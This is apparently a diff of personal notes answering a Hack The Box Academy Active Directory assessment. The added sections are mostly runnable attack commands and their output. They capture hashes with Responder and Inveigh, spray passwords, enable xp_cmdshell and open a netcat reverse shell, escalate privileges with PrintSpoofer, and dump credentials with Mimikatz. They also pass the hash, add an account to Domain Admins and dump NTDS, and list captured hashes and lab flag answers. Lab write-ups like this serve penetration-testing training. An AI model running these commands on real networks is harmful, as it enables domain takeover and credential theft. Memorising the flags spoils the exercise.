@@ -4246,30 +4246,35 @@ Results: Sup3rS3cur3D0m@inU2eR
 **What attack can this user perform?**
 
 ```
-# We will use bloodhound to determine it. We first upload our sharphound collector. In this case, drag the collector from your machine to the target (or copy paste). Now run it: 
+# Use BloodHound to determine permissions. First, upload the SharpHound collector. 
+# Drag and drop the collector from your machine to the target, or use copy-paste. Then run the collector:
 .\SharpHound.exe -c ALL --zipfilename enum
 
-# Open the Internet explorer and open the pivot html server: http://172.16.6.100/uploads/antak.aspx. Now upload the generated collector file to the pivot host
+# Open Internet Explorer on the target machine and navigate to the pivot's HTML server:
+http://172.16.6.100/uploads/antak.aspx
+# Upload the generated collector file to the pivot host.
 
-# Then from the kali machine we will serve the PSUpload.ps1 file to the pivot machine 172.16.6.100. 
+# Next, from the Kali machine, serve the PSUpload.ps1 file to the pivot machine (172.16.6.100):
 python3 -m http.server 9001
 
-# We will retrieve the PSUpload.ps1 file from the pivot 172.16.6.100 
+# Retrieve the PSUpload.ps1 file on the pivot machine:
 Invoke-WebRequest http://10.10.15.140:9001/PSUpload.ps1 -OutFile PSUpload.ps1
 
-# Now we can start our Uploader server from our kali machine
+# Start an uploader server on the Kali machine:
 python3 -m uploadserver
 
-# And now from the pivot host, we will upload the generated collector file to our kali machine
-Import-module .\PSUpload.ps1; Invoke-FileUpload -Uri http://10.10.15.140:8000/upload -File C:\windows\system32\inetsrv\20250106032426_enum.zip 
+# From the pivot host, upload the generated collector file to the Kali machine:
+Import-Module .\PSUpload.ps1; Invoke-FileUpload -Uri http://10.10.15.140:8000/upload -File C:\windows\system32\inetsrv\20250106032426_enum.zip 
 
-# Now we can open our neo4j server in a  kali terminal
-sudo neo4j console 
+# Start the Neo4j server on the Kali machine:
+sudo neo4j console
 
-# And bloodhound
+# Open BloodHound:
 bloodhound
 
-# In bloodhound we search for the node: tpetty. Then we set it as started node. In the Node Info blade, scroll down until Outbound Object Control and see in First Degree Object Control that the user has DCSync permissions over INLANEFREIGHT.LOCAL
+# In BloodHound, search for the node "tpetty." Set it as the starting node. 
+# In the "Node Info" blade, scroll down to "Outbound Object Control" and check the "First Degree Object Control" section. 
+# Confirm that the user has DCSync permissions over INLANEFREIGHT.LOCAL.
 ```
 
 ![](img/attack.png)
@@ -4307,17 +4312,17 @@ Results: r3plicat1on_m@st3r!
 **Obtain a password hash for a domain user account that can be leveraged to gain a foothold in the domain.**
 
 ```
-# Access the pivot machine in two terminals
+# Access the pivot machine using two separate terminals:
 ssh $user@$ip
 
-# From one terminal set a responder server
+# In one terminal, set up a Responder server:
 ip a
 responder -I ens224
 
-# from the other terminal run a recon nmap command
-nmap nmap -T4 -A 172.16.7.0/23 -oN scan.txt
+# In the other terminal, perform a reconnaissance scan using Nmap:
+nmap -T4 -A 172.16.7.0/23 -oN scan.txt
 
-# In the responder we will see several users
+# The Responder server will capture several user credentials during the scan.
 ```
 
 Results: AB920
@@ -4358,30 +4363,31 @@ Results: aud1t_gr0up_m3mbersh1ps!
 **Use a common method to obtain weak credentials for another user. Submit the username for the user whose credentials you obtain.**
 
 ```
-# Connect to the machine with assh reverse proxy
+# Establish an SSH connection with a SOCKS reverse proxy:
 ssh htb-student@$ip -D 1080
 
-# Now we perform enumeration by accessing to the host 172.16.7.50
+# Perform host enumeration by connecting to 172.16.7.50 using RDP:
 proxychains xfreerdp /v:172.16.7.50 /u:AB920 /cert:ignore
 
-# At the end we enumerate the password policy from our kali attacking machine
+# Enumerate the password policy from the Kali attacking machine:
 proxychains crackmapexec smb 172.16.7.3 -u AB920 -p weasal --pass-pol
 ```
 
 ![](img/ad.png)
 
 ```
-# Enumerate users
+# Enumerate user accounts on the target machine:
 proxychains crackmapexec smb 172.16.7.3 -u AB920 -p weasal --users > users.txt
 
-# Give some format to the file so we will only have the user list:
+# Extract and format the list of users to keep only usernames:
 sed -E 's/.*INLANEFREIGHT\.LOCAL\\([A-Z0-9]+).*/\1/' users.txt > final.txt
 
-# Launch a password spray from a kali terminal
+# Perform a password spray attack from the Kali terminal:
 proxychains crackmapexec smb 172.16.7.3 -u final.txt -p /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt --no-bruteforce
 
-# It will take a while.
-# Finally we will have: 
+# Note: This process may take some time.
+
+# Conduct a brute-force attack using Hydra:
 proxychains hydra -L ~/borrar/final.txt -P /usr/share/seclists/Passwords/xato-net-10-million-passwords-10000.txt smb://172.16.7.3
 ```
 
@@ -4394,25 +4400,39 @@ Results: Welcome1
 
 **Locate a configuration file containing an MSSQL connection string. What is the password for the user listed in this file?**
 
-```
-# Enumerate shares in DC01.
+```bash
+# Enumerate shared directories on DC01.
 proxychains smbmap -u BR086 -p Welcome1 -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -r 
 
-# Way 1
-# After confirming this we can connect to 172.16.7.50 with xfreerdp
+# Method 1: Using RDP and File Explorer
+# After confirming access, connect to the MS01 host (172.16.7.50) using RDP:
 proxychains xfreerdp /v:172.16.7.50 /u:BR086 /cert:ignore
-# Now we can open a explorer and enter in the address bar: 172.16.7.3. We will see the shares of DC01.INLANEFREIGHT.LOCAL
-# Now we can browse to \\172.16.7.3\Department Shares\IT\Private\Development and will see the file web.config
 
-# Way 2: from the kali terminal
-smbmap -u BR086 -p Welcome1 -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R "Department Shares"
+# On the RDP session, open File Explorer and enter the following address in the address bar:
+\\172.16.7.3
+
+# View the available shares on DC01.INLANEFREIGHT.LOCAL. Navigate to:
+\\172.16.7.3\Department Shares\IT\Private\Development
+
+# Locate the `web.config` file within this directory.
+
+# Method 2: Accessing shares directly from the Kali terminal
+# Use `smbmap` to list contents of the "Department Shares" directory:
+proxychains smbmap -u BR086 -p Welcome1 -d INLANEFREIGHT.LOCAL -H 172.16.7.3 -R "Department Shares"
+
+# Use `smbclient` to connect to the "Department Shares" directory:
 proxychains smbclient "//172.16.7.3/Department Shares" -U "inlanefreight\BR086"
-# Now we browse to \\172.16.7.3\Department Shares\IT\Private\Development\ 
-dir
-# We retrieve the web.config file 
+
+# Navigate to the desired path:
+cd IT/Private/Development
+
+# Retrieve the `web.config` file:
 get web.config
 quit
+
+# View the contents of the retrieved file:
 cat web.config
+
 ```
 
 Results: D@ta_bAse_adm1n!
@@ -4420,102 +4440,263 @@ user: netdb
 
 **Submit the contents of the flag.txt file on the Administrator Desktop on the SQL01 host.**
 
-```
-# With the user and password from last exercise, we access the mssql database
+```bash
+# Using the user credentials from the previous exercise, we access the MSSQL database:
 proxychains sqsh -S 172.16.7.60 -U netdb -P 'D@ta_bAse_adm1n!' -h
 
-# To allow advanced options to be changed.   
-EXECUTE sp_configure 'show advanced options', 1
-go
-  
-# To update the currently configured value for advanced options.  
-RECONFIGURE
-go
-
-# To enable the feature.  
-EXECUTE sp_configure 'xp_cmdshell', 1
-go
-
-# To update the currently configured value for this feature.  
-RECONFIGURE
-go
-```
-
-![](img/mss.png)
-
-```
-# We try to access to the flag, but we don't have permissions
+# Attempting to access the flag, but we lack the necessary permissions:
 EXEC xp_cmdshell 'type c:\Users\Administrator\Desktop\flag.txt'
 go
 
-# We will execute an attack to capture the MSSQL Service Hash
-# Firts we will run responder in the parrot pivot machine 172.16.7.240
+# Next, we will execute an attack to capture the MSSQL Service Hash.
+# First, we will run Responder on the Parrot pivot machine (172.16.7.240):
 sudo responder -I tun0
 
-# Then from the connection to the database we will try to connect to a share
+# Then, from the database connection, we will attempt to connect to a share:
 EXEC master..xp_dirtree '\\172.16.7.240\share\'
 
-# Our responder will receive the hash:
-SQL01$::INLANEFREIGHT:df85833d580bc60d:7B7DB1880015AAD66DD73BB05952C973:0101000000000000808372934F60DB01C8180BD12D5A254300000000020008003100490032004D0001001E00570049004E002D004B00460046005000360034003800530059005500580004003400570049004E002D004B0046004600500036003400380053005900550058002E003100490032004D002E004C004F00430041004C00030014003100490032004D002E004C004F00430041004C00050014003100490032004D002E004C004F00430041004C0007000800808372934F60DB01060004000200000008003000300000000000000000000000003000002432C5370743BEE2D384041FAAD5C36AED271BC29DBA9D0E55ECC1D6217E37EC0A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0037002E003200340030000000000000000000
+# Responder will capture the hash:
+[SMB] NTLMv2-SSP Client   : 172.16.7.60
+[SMB] NTLMv2-SSP Username : INLANEFREIGHT\SQL01$
+[SMB] NTLMv2-SSP Hash     : SQL01$::INLANEFREIGHT:990b191e92859598:DF973B2CBBD93043B5EDFFF6759136CC:01010000000000000022FC45F460DB018568A6F6B8DD56FA0000000002000800590032004200300001001E00570049004E002D004E004100370059004A004100480045004E003300550004003400570049004E002D004E004100370059004A004100480045004E00330055002E0059003200420030002E004C004F00430041004C000300140059003200420030002E004C004F00430041004C000500140059003200420030002E004C004F00430041004C00070008000022FC45F460DB0106000400020000000800300030000000000000000000000000300000011450EFCD9DCCD865F6DC7EB88F78C1416D20A04A5E33C2E24A3FD09103F3C70A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E0037002E003200340030000000000000000000
+
+# However, this doesn't yield any results (I attempted to access services/machines using CrackMapExec). So, I eventually obtained a simple reverse shell by exploiting the SQL server to enumerate more easily.
+# First, I uploaded nc64.exe to the pivot host (172.16.7.240). Then, I served the file to 172.16.7.60:
+python3 -m http.server 9001
+
+# From the terminal with the connection to the server (172.16.7.60), I uploaded the file to SQL01:
+xp_cmdshell "powershell -c cd C:\Users\Public\Downloads; Invoke-WebRequest http://172.16.7.240:9001/nc64.exe -outfile nc64.exe"
+go 
+
+# Verify the file has been uploaded:
+xp_cmdshell "powershell -c dir C:\Users\Public\Downloads"
+go 
+
+# Start a listener on the Parrot pivot machine (172.16.7.240):
+nc -lnvp 5665
+
+# Now, establish the reverse connection:
+xp_cmdshell "powershell -c cd C:\Users\Public\Downloads; .\nc64.exe -e cmd.exe 172.16.7.240 5665"
+
+# On the Parrot pivot machine, we now have a reverse shell from 172.16.7.60. We can begin enumeration.
+whoami /priv
+
+# We will notice the following privileges:
+Privilege Name                Description                               State   
+============================= ========================================= ========
+SeAssignPrimaryTokenPrivilege Replace a process-level token             Disabled
+SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
+SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
+SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
+SeCreateGlobalPrivilege       Create global objects                     Enabled 
+SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+
+# We will exploit SeImpersonatePrivilege, which allows us to elevate from LOCAL/NETWORK SERVICE to SYSTEM by leveraging the PrintSpoofer vulnerability on Windows 10 and Server 2016/2019.
+
+# On your Kali machine, download the PrintSpoofer executable from https://github.com/itm4n/PrintSpoofer. Transfer the file to the Parrot pivot host (172.16.7.240). Then, on the Parrot pivot host, serve the file:
+python3 -m http.server 9001
+
+# From the reverse shell terminal (172.16.7.60), download the file:
+powershell -c cd C:\Users\Public\Downloads;  Invoke-WebRequest http://172.16.7.240:9001/PrintSpoofer64.exe -outfile PrintSpoofer64.exe
+
+# From the reverse shell terminal (172.16.7.60), execute the PrintSpoofer tool:
+.\PrintSpoofer64.exe -i -c cmd.exe
+
+# Verify the current user:
+whoami
+
+# Finally, retrieve the flag:
+type c:/Users/Administrator/Desktop/flag.txt
 ```
 
-Results: 
+Results:  s3imp3rs0nate_cl@ssic
 
 
  **Submit the contents of the flag.txt file on the Administrator Desktop on the MS01 host.**
 
 ```
+# We have gained admin rights on the host SQL01 (172.16.7.60). From there, we will use Mimikatz. To do so, we need to transfer the Mimikatz executable from our Kali machine to the Parrot pivot machine.
+# On Kali:
+python3 -m http.server 9001
 
+# On the Parrot pivot machine:
+wget http://10.10.15.140:9001/mimikatz.exe
+
+# Now, we will serve the file from the Parrot pivot machine:
+python3 -m http.server 9001
+
+# From the reverse shell on SQL01 (172.16.7.60), open PowerShell and download the file:
+powershell
+certutil -urlcache -split -f http://172.16.7.240:9001/mimikatz.exe mimikatz.exe
+
+# Run Mimikatz and list the users logged into the machine and still in memory:
+.\mimikatz.exe
+privilege::debug
+token::elevate
+sekurlsa::logonPasswords full
+
+# We will notice this user with the NTLM hash:
+# mssqlsvc
+# NTLM: 8c9555327d95f815987c0d81238c7660
+
+####### Way 1
+# Now, from our Kali machine, we will use the SSH reverse proxy established earlier with `ssh $user@$ip -D 9050` to access the MS01 target machine. We will use the Pass-The-Hash technique:
+proxychains crackmapexec smb 172.16.7.50 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660 -d INLANEFREIGHT.LOCAL 
+
+# Dumping SAM hashes:
+proxychains crackmapexec smb 172.16.7.50 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660 -d INLANEFREIGHT.LOCAL --sam
+
+########
+# SMB         172.16.7.50     445    MS01             [+] Dumping SAM hashes
+# SMB         172.16.7.50     445    MS01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:bdaffbfe64f1fc646a3353be1c2c3c99:::
+# SMB         172.16.7.50     445    MS01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# SMB         172.16.7.50     445    MS01             DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+# SMB         172.16.7.50     445    MS01             WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:4b4ba140ac0767077aee1958e7f78070:::
+# SMB         172.16.7.50     445    MS01             [+] Added 4 SAM hashes to the database
+##########
+
+# NTDS dump:
+proxychains crackmapexec smb 172.16.7.50 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660 -d INLANEFREIGHT.LOCAL --ntds
+#### [+] Dumped 0 NTDS hashes
+
+# Now, we can extract the flag:
+# First, check the user:
+proxychains crackmapexec smb 172.16.7.50 -u mssqlsvc -H bdaffbfe64f1fc646a3353be1c2c3c99 -d INLANEFREIGHT.LOCAL  -x 'whoami' --exec-method smbexec
+# Result: nt authority\system
+
+# Now, print the flag.txt:
+proxychains crackmapexec smb 172.16.7.50 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660 -d INLANEFREIGHT.LOCAL  -x 'type c:\Users\Administrator\Desktop\flag.txt' --exec-method smbexec
+
+####### Way 2
+# Another way is to open an RDP connection using Pass-the-Hash:
+proxychains xfreerdp /v:172.16.7.50 /u:mssqlsvc /pth:8c9555327d95f815987c0d81238c7660 /cert-ignore
+
+# We encounter an issue: **Restricted Admin Mode** is disabled by default on the target host, which results in an error. To proceed, we need to enable this mode. 
+# As we have command execution access via CrackMapExec on 172.16.7.50, we will add a registry key `DisableRestrictedAdmin` (REG_DWORD) under `HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa` with a value of 0.
+proxychains crackmapexec smb 172.16.7.50 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660 -d INLANEFREIGHT.LOCAL  -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f' --exec-method smbexec
+
+# Now we can access the target via RDP:
+proxychains xfreerdp /v:172.16.7.50 /u:mssqlsvc /pth:8c9555327d95f815987c0d81238c7660 /cert-ignore
+
+# Finally, open PowerShell as Admin and read the file.
 ```
 
-Results:
+Results:  exc3ss1ve_adm1n_r1ights!
 
 
 **Obtain credentials for a user who has GenericAll rights over the Domain Admins group. What's this user's account name?**
 
+```powershell
+# We have obtained a foothold with administrative rights on the MS01 host (172.16.7.50). From here, we will use SharpHound to collect Active Directory data. First, we transfer the SharpHound executable from our Kali machine to the Parrot pivot machine.
+
+# On the Kali machine:
+python3 -m http.server 9001
+
+# On the Parrot pivot machine:
+wget http://10.10.15.140:9001/SharpHound.exe
+
+# Serve the SharpHound executable from the Parrot pivot machine:
+python3 -m http.server 9001
+
+# From the MS01 host (172.16.7.50) via RDP:
+proxychains xfreerdp /v:172.16.7.50 /u:mssqlsvc /pth:8c9555327d95f815987c0d81238c7660 /cert-ignore
+
+# Open a PowerShell terminal and download the SharpHound executable:
+powershell
+certutil -urlcache -split -f http://172.16.7.240:9001/SharpHound.exe SharpHound.exe
+
+# Run the SharpHound collector on MS01 (172.16.7.50):
+.\SharpHound.exe -c All --zipfilename enum
+
+# Save the collected data in the `C:\Users\Public\Downloads` folder. Configure the folder to be shared on the network. Once shared, download the collected data to the Kali machine:
+proxychains smbclient "//172.16.7.50/Users" -U "inlanefreight\BR086"
+cd Public
+cd Downloads
+get file_enum.zip
+
+# Open BloodHound for analysis:
+# In one terminal, start the Neo4j database:
+sudo neo4j console
+
+# In another terminal, launch BloodHound:
+bloodhound
+
+# Upload the collected data file (file_enum.zip) to BloodHound.
+
+# Set `DOMAIN.ADMINS` as the starting node for analysis. In the Node tab, click on "Inbound Control Rights" > "Explicit Objects Controllers" and identify the user `CT059`.
 ```
 
-```
-
-Results:
+Results: CT059
 
 
 **Crack this user's password hash and submit the cleartext password as your answer.**
 
+```powershell
+# Upload Inveigh.exe to the MS01 machine:
+# From the Parrot pivot machine (172.16.7.240), start a Python HTTP server:
+python3 -m http.server 9001
+# From the MS01 host machine (172.16.7.50), download the file using CertUtil:
+certutil -urlcache -split -f http://172.16.7.240:9001/Inveigh.exe Inveigh.exe
+
+# Run Inveigh.exe on the MS01 host machine (172.16.7.50):
+.\Inveigh.exe
+
+# After some time, observe the captured NTLMv2 hash:
+[+] SMB(445) NTLMv2 captured for [INLANEFREIGHT\CT059] from 172.16.7.3 (DC01):51255:
+CT059::INLANEFREIGHT:12263838B200FD3E:3EE6EA4C91EC7FB8A095770E051B8376:0101000000000000E08DF4460462DB01364B979606FF3B0B0000000002001A0049004E004C0041004E0045004600520045004900470048005400010008004D005300300031000400260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C00030030004D005300300031002E0049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C000500260049004E004C0041004E00450046005200450049004700480054002E004C004F00430041004C0007000800E08DF4460462DB01060004000200000008003000300000000000000000000000002000004CEB572AE37933B1CF59600EAD9B1A90422724811037093D434F05A8D1980E0E0A001000000000000000000000000000000000000900200063006900660073002F003100370032002E00310036002E0037002E0035003000000000000000000000000000
+
+# Crack the captured NTLMv2 hash using Hashcat:
+hashcat -m 5600 CT059 /usr/share/wordlists/rockyou.txt
 ```
 
-```
-
-Results:
+Results: charlie1
 
 
 
 **Submit the contents of the flag.txt file on the Administrator desktop on the DC01 host.**
 
+```bash
+# First, we test our connection:
+proxychains crackmapexec smb 172.16.7.3 -u CT059 -p charlie1 -d INLANEFREIGHT.LOCAL
+
+# We observe that this user has a GenericAll ACL over the domain, meaning they have the ability to add another user to the Domain Admins group, for example.
+
+# To proceed, we first open a terminal session on MS01. For this, we need to modify the registry:
+proxychains crackmapexec smb 172.16.7.50 -u mssqlsvc -H 8c9555327d95f815987c0d81238c7660 -d INLANEFREIGHT.LOCAL -x 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f' --exec-method smbexec
+
+# With the registry modified, we can now establish an RDP connection:
+proxychains xfreerdp /v:172.16.7.50 /u:mssqlsvc /pth:8c9555327d95f815987c0d81238c7660 /cert-ignore
+
+# Once connected, open a PowerShell terminal as Administrator and download the PowerView.ps1 module from the Parrot pivot machine (172.16.7.240):
+certutil -urlcache -split -f http://172.16.7.240:9001/PowerView.ps1 PowerView.ps1
+
+# Using the PowerView module, the user CT059 will add AB920 to the Domain Admins group:
+$SecPassword = ConvertTo-SecureString 'charlie1' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\CT059', $SecPassword)
+Import-Module .\PowerView.ps1
+Add-DomainGroupMember -Identity 'Domain Admins' -Members 'AB920' -Credential $Cred
+
+# Now, with the AB920 account in the Domain Admins group, we can proceed to dump the NTDS:
+proxychains crackmapexec smb 172.16.7.3 -u AB920 -p weasal -d INLANEFREIGHT.LOCAL --ntds
+
+# Confirming that the connection is successful:
+proxychains crackmapexec smb 172.16.7.3 -u Administrator -H '234a798328eb83fda24119597ffba70b' -x 'whoami' --exec-method smbexec
+
+# Finally, dumping the flag:
+proxychains crackmapexec smb 172.16.7.3 -u Administrator -H '234a798328eb83fda24119597ffba70b' -x 'type c:\Users\Administrator\Desktop\flag.txt' --exec-method smbexec
 ```
 
-```
-
-Results:
+Results: acLs_f0r_th3_w1n!
 
 
 **Submit the NTLM hash for the KRBTGT account for the target domain after achieving domain compromise.**
 
 ```
-
+proxychains crackmapexec smb 172.16.7.3  -u AB920 -p weasal -d INLANEFREIGHT.LOCAL --ntds
+# Krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7eba70412d81c1cd030d72a3e8dbe05f::: 
 ```
 
-Results:
-
-
-Question
-
-```
-
-```
-
-Results:
-
+Results: 7eba70412d81c1cd030d72a3e8dbe05f
 
 
 ## [Using Web Proxies](https://academy.hackthebox.com/module/details/110)
